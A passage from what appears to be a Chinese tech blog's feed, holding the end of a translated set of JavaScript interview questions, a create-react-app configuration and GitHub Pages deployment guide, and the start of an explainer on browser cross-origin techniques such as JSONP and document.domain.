class="line">(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (x) &#123;</span><br><span class="line">        <span class="keyword">var</span> x = <span class="number">1</span>, y = <span class="number">2</span>;</span><br><span class="line">        <span class="built_in">console</span>.log(x);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">console</span>.log(x);</span><br><span class="line">    <span class="built_in">console</span>.log(y);</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span></span><br><span class="line"><span class="literal">undefined</span></span><br><span class="line"><span class="number">2</span></span><br></pre></td></tr></table></figure><p>var语句被挂起（没有它们的值初始化）到它所属的全局或函数作用域的顶部，即使它位于with或catch块内。但是，错误的标识符只在catch块内部可见。它相当于：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> x, y; <span class="comment">// outer and hoisted</span></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (x <span class="comment">/* inner */</span>) &#123;</span><br><span class="line">        x = <span class="number">1</span>; <span class="comment">// inner x, not the outer one</span></span><br><span class="line">        y = <span class="number">2</span>; <span class="comment">// there is only one y, which is in the outer scope</span></span><br><span class="line">        <span class="built_in">console</span>.log(x <span class="comment">/* inner */</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">console</span>.log(x);</span><br><span class="line">    <span class="built_in">console</span>.log(y);</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure><h2 id="这段代码的输出是什么"><a href="#这段代码的输出是什么" class="headerlink" title="这段代码的输出是什么"></a>这段代码的输出是什么</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> x = <span class="number">21</span>;</span><br><span class="line"><span class="keyword">var</span> girl = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(x);</span><br><span class="line">    <span class="keyword">var</span> x = <span class="number">20</span>;</span><br><span class="line">&#125;;</span><br><span class="line">girl ();</span><br></pre></td></tr></table></figure><p>21，也不是20，结果是‘undefined’的</p><p>这是因为JavaScript初始化没有被挂起。</p><p>（为什么它不显示21的全局值？原因是当函数执行时，它检查是否存在本地x变量但尚未声明它，因此它不会查找全局变量。 ）</p><h2 id="你如何克隆一个对象"><a href="#你如何克隆一个对象" class="headerlink" title="你如何克隆一个对象"></a>你如何克隆一个对象</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = &#123;<span class="attr">a</span>: <span class="number">1</span> ,<span class="attr">b</span>: <span class="number">2</span>&#125;</span><br><span class="line"><span class="keyword">var</span> objclone = <span class="built_in">Object</span>.assign(&#123;&#125;,obj);</span><br></pre></td></tr></table></figure><p>现在objclone的值是{a：1，b：2}，但指向与obj不同的对象。</p><p>但请注意潜在的缺陷：Object.clone（）只会执行浅拷贝，而不是深拷贝。这意味着嵌套的对象不会被复制。他们仍然引用与原始相同的嵌套对象：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> obj = &#123;</span><br><span class="line">    a: <span class="number">1</span>,</span><br><span class="line">    b: <span class="number">2</span>,</span><br><span class="line">    c: &#123;</span><br><span class="line">        age: <span class="number">30</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> objclone = <span class="built_in">Object</span>.assign(&#123;&#125;,obj);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'objclone: '</span>, objclone);</span><br><span class="line"></span><br><span class="line">obj.c.age = <span class="number">45</span>;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'After Change - obj: '</span>, obj);           <span class="comment">// 45 - This also changes</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'After Change - objclone: '</span>, objclone); <span class="comment">// 45</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">5</span>; i++) &#123;</span><br><span class="line">  setTimeout(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123; <span class="built_in">console</span>.log(i); &#125;, i * <span class="number">1000</span> );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="此代码将打印什么"><a href="#此代码将打印什么" class="headerlink" title="此代码将打印什么"></a>此代码将打印什么</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">5</span>; i++) &#123;</span><br><span class="line">    setTimeout(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123; <span class="built_in">console</span>.log(i); &#125;, i * <span class="number">1000</span> );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>它会打印0 1 2 3 4，因为我们在这里使用let而不是var。变量i只能在for循环的块范围中看到。</p><h2 id="以下几行输出什么，为什么"><a href="#以下几行输出什么，为什么" class="headerlink" title="以下几行输出什么，为什么"></a>以下几行输出什么，为什么</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">console</span>.log(<span class="number">1</span> &lt; <span class="number">2</span> &lt; <span class="number">3</span>);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="number">3</span> &gt; <span class="number">2</span> &gt; <span class="number">1</span>);</span><br></pre></td></tr></table></figure><p>第一条语句返回true，如预期的那样。</p><p>第二个返回false是因为引擎如何针对&lt;和&gt;的操作符关联性工作。它比较从左到右，所以3&gt; 2&gt; 1 JavaScript翻译为true&gt; 1. true具有值1，因此它比较1&gt; 1，这是错误的。</p><h2 id="如何在数组的开头添加元素？最后如何添加一个"><a href="#如何在数组的开头添加元素？最后如何添加一个" class="headerlink" title="如何在数组的开头添加元素？最后如何添加一个"></a>如何在数组的开头添加元素？最后如何添加一个</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> myArray = [<span class="string">'a'</span>, <span class="string">'b'</span>, <span class="string">'c'</span>, <span class="string">'d'</span>];</span><br><span class="line">myArray.push(<span class="string">'end'</span>);</span><br><span class="line">myArray.unshift(<span class="string">'start'</span>);</span><br><span class="line"><span class="built_in">console</span>.log(myArray); <span class="comment">// ["start", "a", "b", "c", "d", "end"]</span></span><br></pre></td></tr></table></figure><p>使用ES6，可以使用扩展运算符：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">myArray = [<span class="string">'start'</span>, ...myArray];</span><br><span class="line">myArray = [...myArray, <span class="string">'end'</span>];</span><br></pre></td></tr></table></figure><p>或者，简而言之：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">myArray = [<span class="string">'start'</span>, ...myArray, <span class="string">'end'</span>];</span><br></pre></td></tr></table></figure><h2 id="想象一下你有这样的代码吗"><a href="#想象一下你有这样的代码吗" class="headerlink" title="想象一下你有这样的代码吗"></a>想象一下你有这样的代码吗</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>];</span><br></pre></td></tr></table></figure><p>a）这会导致崩溃吗？</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a[<span class="number">10</span>] = <span class="number">99</span>;</span><br></pre></td></tr></table></figure><p>b）这个输出是什么？</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">console</span>.log(a[<span class="number">6</span>]);</span><br></pre></td></tr></table></figure><p>a）它不会崩溃。 JavaScript引擎将使阵列插槽3至9成为“空插槽”。</p><p>b）在这里，a [6]将输出未定义的值，但时隙仍为空，而不是未定义的。在某些情况下，这可能是一个重要的细微差别。例如，使用map（）时，map（）的输出中的空插槽将保持为空，但未定义的插槽将使用传递给它的函数重映射：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> b = [<span class="literal">undefined</span>];</span><br><span class="line">b[<span class="number">2</span>] = <span class="number">1</span>;</span><br><span class="line"><span class="built_in">console</span>.log(b);             <span class="comment">// (3) [undefined, empty × 1, 1]</span></span><br><span class="line"><span class="built_in">console</span>.log(b.map(<span class="function"><span class="params">e</span> =&gt;</span> <span class="number">7</span>)); <span class="comment">// (3) [7,         empty × 1, 7]</span></span><br></pre></td></tr></table></figure><h2 id="typeof-undefined-typeof-NULL的值是什么"><a href="#typeof-undefined-typeof-NULL的值是什么" class="headerlink" title="typeof undefined == typeof NULL的值是什么"></a>typeof undefined == typeof NULL的值是什么</h2><p>该表达式将被评估为true，因为NULL将被视为任何其他未定义的变量。</p><p>注意：JavaScript区分大小写，我们在这里使用NULL而不是null。</p><h2 id="代码返回后会怎么样"><a href="#代码返回后会怎么样" class="headerlink" title="代码返回后会怎么样"></a>代码返回后会怎么样</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">console</span>.log(<span class="keyword">typeof</span> <span class="keyword">typeof</span> <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">string</span><br></pre></td></tr></table></figure><p>typeof 1将返回“number”，typeof“number”将返回字符串。</p><h2 id="以下代码输出什么？为什么"><a href="#以下代码输出什么？为什么" class="headerlink" title="以下代码输出什么？为什么"></a>以下代码输出什么？为什么</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> b = <span class="number">1</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">outer</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">       <span class="keyword">var</span> b = <span class="number">2</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">inner</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        b++;</span><br><span class="line">        <span class="keyword">var</span> b = <span class="number">3</span>;</span><br><span class="line">        <span class="built_in">console</span>.log(b)</span><br><span class="line">    &#125;</span><br><span class="line">    inner();</span><br><span class="line">&#125;</span><br><span class="line">outer();</span><br></pre></td></tr></table></figure><p>输出到控制台将是“3”。</p><p>在这个例子中有三个闭包，每个都有它自己的var b声明。当调用变量时，将按照从本地到全局的顺序检查闭包，直到找到实例。由于内部闭包有自己的b变量，这就是输出。</p><p>此外，由于提升内部的代码将被解释如下：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">inner</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> b; <span class="comment">// b is undefined</span></span><br><span class="line">    b++; <span class="comment">// b is NaN</span></span><br><span class="line">    b = <span class="number">3</span>; <span class="comment">// b is 3</span></span><br><span class="line">    <span class="built_in">console</span>.log(b); <span class="comment">// output "3"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>面试比棘手的技术问题要多，所以这些仅仅是作为指导。并不是每个值得聘用的“A”候选人都能够回答所有问题，也不会回答他们都保证有“A”候选人。在这一天结束时，招聘仍然是一门艺术，一门科学 - 还有很多工作。.</p><p>原文链接:<a href="https://www.toptal.com/javascript/interview-questions" target="_blank" rel="noopener">https://www.toptal.com/javascript/interview-questions</a><br>转载链接:<a href="https://www.zcfy.cc/article/37-essential-javascript-interview-questions-and-answers" target="_blank" rel="noopener">https://www.zcfy.cc/article/37-essential-javascript-interview-questions-and-answers</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;有关于JavaScript的基本面试问题和解答。&lt;br&gt;
    
    </summary>
    
      <category term="js" scheme="https://luckyp.top/categories/js/"/>
    
    
      <category term="js" scheme="https://luckyp.top/tags/js/"/>
    
      <category term="面试" scheme="https://luckyp.top/tags/%E9%9D%A2%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>create-react-app</title>
    <link href="https://luckyp.top/create-react-app/"/>
    <id>https://luckyp.top/create-react-app/</id>
    <published>2018-05-23T07:21:10.000Z</published>
    <updated>2018-05-23T07:21:10.000Z</updated>
    
    <content type="html"><![CDATA[<p>近期，趁着空闲时间，学习了下react的相关知识，对于配置问题，为了方便快速上手，就采用了官方的<a href="https://github.com/facebook/create-react-app" target="_blank" rel="noopener">create-react-app</a>来配置环境。期间遇到不少问题。总结一下。</p><p>项目基本完成，还有一些需要小优化。展示链接<a href="http://luckyp.top/cnode/">http://luckyp.top/cnode/</a>，备用链接<a href="https://rcnode.luckyp.top/" target="_blank" rel="noopener">https://rcnode.luckyp.top/</a><br><a id="more"></a></p><h2 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h2><p>对于react来说，需要注意的就是它的生命周期问题，网上有大量的资料，一幅图简单的说明如下</p><p><img src="../images/component-lifecycle.jpg" alt="component-lifecycle.jpg"></p><table><thead><tr><th style="text-align:left">生命周期</th><th style="text-align:center">调用次数</th><th style="text-align:center">能否使用 setSate()</th></tr></thead><tbody><tr><td style="text-align:left">getDefaultProps</td><td style="text-align:center">1(全局调用一次)</td><td style="text-align:center">否</td></tr><tr><td style="text-align:left">getInitialState</td><td style="text-align:center">1</td><td style="text-align:center">否</td></tr><tr><td style="text-align:left">componentWillMount</td><td style="text-align:center">1</td><td style="text-align:center">是</td></tr><tr><td style="text-align:left">render</td><td style="text-align:center">&gt;=1</td><td style="text-align:center">否</td></tr><tr><td style="text-align:left">componentDidMount</td><td style="text-align:center">1</td><td style="text-align:center">是</td></tr><tr><td style="text-align:left">componentWillReceiveProps(nextProps)</td><td style="text-align:center">&gt;=0</td><td style="text-align:center">否</td></tr><tr><td style="text-align:left">shouldComponentUpdate(nextProps,nextState)</td><td style="text-align:center">&gt;=0</td><td style="text-align:center">否</td></tr><tr><td style="text-align:left">componentWillUpdate(nextProps,nextState)</td><td style="text-align:center">&gt;=0</td><td style="text-align:center">否</td></tr><tr><td style="text-align:left">componentDidUpdate(prevProps,prevState)</td><td style="text-align:center">&gt;=0</td><td style="text-align:center">否</td></tr><tr><td style="text-align:left">componentWillUnmount</td><td style="text-align:center">1</td><td style="text-align:center">否</td></tr></tbody></table><h2 id="create-react-app"><a href="#create-react-app" class="headerlink" title="create-react-app"></a>create-react-app</h2><h3 id="配置文件"><a href="#配置文件" class="headerlink" title="配置文件"></a>配置文件</h3><p>为了方便使用，<code>create-react-app</code>提供了直接暴露配置文件的方法,如下</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm run eject</span><br></pre></td></tr></table></figure><p>当然是单向不可逆操作的，为了尽可能的减少改变源码的操作，使用了另外一种办法，通过<a href="https://github.com/timarney/react-app-rewired" target="_blank" rel="noopener">react-app-rewired</a></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install react-app-rewired --save-dev</span><br></pre></td></tr></table></figure><p>简单的使用方式就是在根目录创建一个config-overrides.js文件,调整package.json的默认配置。详细配置见github。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* config-overrides.js */</span></span><br><span class="line"><span class="built_in">module</span>.exports = <span class="function"><span class="keyword">function</span> <span class="title">override</span>(<span class="params">config, env</span>) </span>&#123;</span><br><span class="line">  <span class="comment">//do stuff with the webpack config...</span></span><br><span class="line">  <span class="keyword">return</span> config;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* package.json */</span></span><br><span class="line">  <span class="string">"scripts"</span>: &#123;</span><br><span class="line">-   <span class="string">"start"</span>: <span class="string">"react-scripts start"</span>,</span><br><span class="line">+   <span class="string">"start"</span>: <span class="string">"react-app-rewired start"</span>,</span><br><span class="line">-   <span class="string">"build"</span>: <span class="string">"react-scripts build"</span>,</span><br><span class="line">+   <span class="string">"build"</span>: <span class="string">"react-app-rewired build"</span>,</span><br><span class="line">-   <span class="string">"test"</span>: <span class="string">"react-scripts test --env=jsdom"</span>,</span><br><span class="line">+   <span class="string">"test"</span>: <span class="string">"react-app-rewired test --env=jsdom"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="github-pages部署"><a href="#github-pages部署" class="headerlink" title="github pages部署"></a>github pages部署</h2><h3 id="homepage设置"><a href="#homepage设置" class="headerlink" title="homepage设置"></a>homepage设置</h3><p>在项目完成之后，打包，通过的也是<code>npm run build</code>（同<code>yarn run build</code>）,如果直接上传到github服务器托管会存在路径问题，这里查看<a href="https://github.com/facebook/create-react-app/blob/master/packages/react-scripts/template/README.md#deployment" target="_blank" rel="noopener">文档</a>可以知道。需要在<code>package.json</code>中设置</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">"homepage": "http://mywebsite.com/relativepath",</span><br></pre></td></tr></table></figure><p>如果没有托管的服务器地址，也可以设置为</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">"homepage":"."</span><br></pre></td></tr></table></figure><h3 id="项目页面设置"><a href="#项目页面设置" class="headerlink" title="项目页面设置"></a>项目页面设置</h3><p>因为上传的GitHub用户页面被博客占用，所以只能使用项目页面，需要添加<a href="https://github.com/tschaub/gh-pages" target="_blank" rel="noopener">gh-pages</a></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">npm install --save gh-pages</span><br><span class="line"></span><br><span class="line"><span class="comment">/* package.json */</span></span><br><span class="line"><span class="string">"scripts"</span>: &#123;</span><br><span class="line">+   <span class="string">"predeploy"</span>: <span class="string">"npm run build"</span>,</span><br><span class="line">+   <span class="string">"deploy"</span>: <span class="string">"gh-pages -d build"</span>,</span><br><span class="line">    <span class="string">"start"</span>: <span class="string">"react-app-rewired start"</span>,</span><br><span class="line">    <span class="string">"build"</span>: <span class="string">"react-app-rewired build"</span>,</span><br></pre></td></tr></table></figure><p><code>npm run deploy</code>会执行<code>predeploy</code>,同时上传创建github的分支，默认<code>gh-pages</code>分支。进入项目主页，设置<code>gh-pages</code>分支展示为page即可。</p><p>这时候页面的展示地址应该是<code>https://myusername.github.io/project-name</code>。</p><h3 id="路由设置"><a href="#路由设置" class="headerlink" title="路由设置"></a>路由设置</h3><p>因为使用react-router@^4，所以还需要设置在<code>&lt;Router&gt;</code>中设置<code>basename</code>，该值为你的项目名称。这里我的项目是名称是<code>cnode</code>。</p><p>可以新建一个文件,然后导出，判断是否为开发环境，以便用于域名的二级目录。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> basename = process.env.NODE_ENV === <span class="string">'production'</span> ? <span class="string">'/cnode'</span> : <span class="string">''</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> basename</span><br></pre></td></tr></table></figure><p>因为需要部署到github，而GitHub Pages存在一个问题，不支持pushState引擎盖下使用HTML5 历史API的路由器（例如，使用React Router browserHistory）。因为在<code>https://myusername.github.io/project-name/topics</code>中,<code>/topics</code>属于前端部分，后端获取不到，会报404错误。</p><p>这里有两种解决方式，一种就是通过重定向，当404时，跳转你设置好的页面，另一种就是使用<code>hashHistory</code>,不过存在的问题是，路径过长，这里我采用的是第二种方法。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;近期，趁着空闲时间，学习了下react的相关知识，对于配置问题，为了方便快速上手，就采用了官方的&lt;a href=&quot;https://github.com/facebook/create-react-app&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;create-react-app&lt;/a&gt;来配置环境。期间遇到不少问题。总结一下。&lt;/p&gt;
&lt;p&gt;项目基本完成，还有一些需要小优化。展示链接&lt;a href=&quot;http://luckyp.top/cnode/&quot;&gt;http://luckyp.top/cnode/&lt;/a&gt;，备用链接&lt;a href=&quot;https://rcnode.luckyp.top/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://rcnode.luckyp.top/&lt;/a&gt;&lt;br&gt;
    
    </summary>
    
      <category term="react" scheme="https://luckyp.top/categories/react/"/>
    
    
      <category term="react" scheme="https://luckyp.top/tags/react/"/>
    
      <category term="脚手架" scheme="https://luckyp.top/tags/%E8%84%9A%E6%89%8B%E6%9E%B6/"/>
    
  </entry>
  
  <entry>
    <title>跨域</title>
    <link href="https://luckyp.top/%E8%B7%A8%E5%9F%9F/"/>
    <id>https://luckyp.top/跨域/</id>
    <published>2018-04-26T16:00:00.000Z</published>
    <updated>2018-04-26T16:00:00.000Z</updated>
    
    <content type="html"><![CDATA[<p>关于浏览器跨域，经常会遇到这方面的问题，整理一下相关资源。<br><a id="more"></a></p><h2 id="跨域概念"><a href="#跨域概念" class="headerlink" title="跨域概念"></a>跨域概念</h2><p>举个简单的例子：<br>一个地址为<code>URLA</code>的页面A试图请求另一个地址为<code>URLB</code>的资源。</p><p>它们的地址（<code>URLA</code>/<code>URLB</code>）中主机名（域名）、协议、端口号，只要有一个不相同，就为不同的域（或源），即异源，注意即便两个不同的域名指向同一个ip地址，也是异源。</p><p>相对的，如果相同，即为浏览器的同源策略/SOP（Same origin policy），同源策略限制以下几种行为：</p><ol><li>Cookie、LocalStorage 和 IndexDB 无法读取</li><li>DOM 和 Js对象无法获得</li><li>AJAX 请求不能发送</li></ol><h2 id="跨域方案"><a href="#跨域方案" class="headerlink" title="跨域方案"></a>跨域方案</h2><h3 id="JSONP"><a href="#JSONP" class="headerlink" title="JSONP"></a>JSONP</h3><p>浏览器允许html标签从不同域名下加载静态资源，在此基础上，可通过动态创建script标签，请求一个带参数的网址实现跨域通信。</p><p>缺点是只能通过GET方式请求。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// JavaScript</span></span><br><span class="line"><span class="keyword">var</span> script = <span class="built_in">document</span>.createElement(<span class="string">'script'</span>);</span><br><span class="line">script.type = <span class="string">'text/javascript'</span>;</span><br><span class="line"><span class="comment">// 传参并指定回调执行函数为back</span></span><br><span class="line">script.src = <span class="string">'http://example.com/login?callback=back'</span>;</span><br><span class="line"><span class="built_in">document</span>.head.appendChild(script);</span><br><span class="line"></span><br><span class="line"><span class="comment">// jquery</span></span><br><span class="line">$.ajax(&#123;</span><br><span class="line">    url: <span class="string">'http://example.com/login'</span>,</span><br><span class="line">    type: <span class="string">'get'</span>,</span><br><span class="line">    dataType: <span class="string">'jsonp'</span>,  <span class="comment">// 请求方式为jsonp</span></span><br><span class="line">    jsonpCallback: <span class="string">"back"</span>,    <span class="comment">// 自定义回调函数名</span></span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 需要回调执行函数</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">back</span>(<span class="params">res</span>) </span>&#123;</span><br><span class="line">    alert(<span class="built_in">JSON</span>.stringify(res));</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 服务端返回</span></span><br><span class="line">back(&#123;<span class="string">"status"</span>: <span class="literal">true</span>, <span class="string">"user"</span>: <span class="string">"admin"</span>&#125;)</span><br></pre></td></tr></table></figure><h3 id="document-domain"><a href="#document-domain" class="headerlink" title="document.domain"></a>document.domain</h3><p>仅适用于主域相同，子域不同。可以共享Cookie。</p><p><code>www.example.com/a.html</code> 和<code>child.example.com/b.html</code>相互之间的通信，两个页面都需要设置：<br><code>document.domain = &#39;example.com&#39;;</code></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 结合iframe实现更多跨域</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// www.example.com/a.html</span></span><br><span class="line"><span class="built_in">document</span>.domain = <span class="string">'domain.com'</span>;</span><br><span class="line"><span class="keyword">var</span> user = <span class="string">'admin'</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// child.example.com/b.html</span></span><br><span class="line"><span class="built_in">document</span>.domain = <span class="string">'domain.com'</span>;</span><br><span class="line">alert(<span class="string">'父窗口变量user'</span> + <span class="built_in">window</span>.parent.user);</span><br></pre></td></tr></table></figure><h3 id="window-name"><a href="#window-name" class="headerlink" title="window.name"></a>window.name</h3><p>适用于iframe嵌套。</p><p><code>window.name</code>是在同一个浏览器窗口下打开的所有页面共享的字段，最多可支持2MB。可以通过在<code>b.html</code>中设置<code>window.name</code>的值，在<code>a.html</code>中取出改值使用。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// www.domain1.com/a.html</span></span><br><span class="line"><span class="keyword">var</span> proxy = <span class="function"><span class="keyword">function</span>(<span class="params">url, callback</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> state = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">var</span> iframe = <span class="built_in">document</span>.createElement(<span class="string">'iframe'</span>);</span><br><span class="line">    <span class="comment">// 加载跨域页面</span></span><br><span class="line">    iframe.src = url;</span><br><span class="line">    <span class="comment">// onload事件会触发2次，第1次加载跨域页，并留存数据于window.name</span></span><br><span class="line">    iframe.onload = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (state === <span class="number">1</span>) 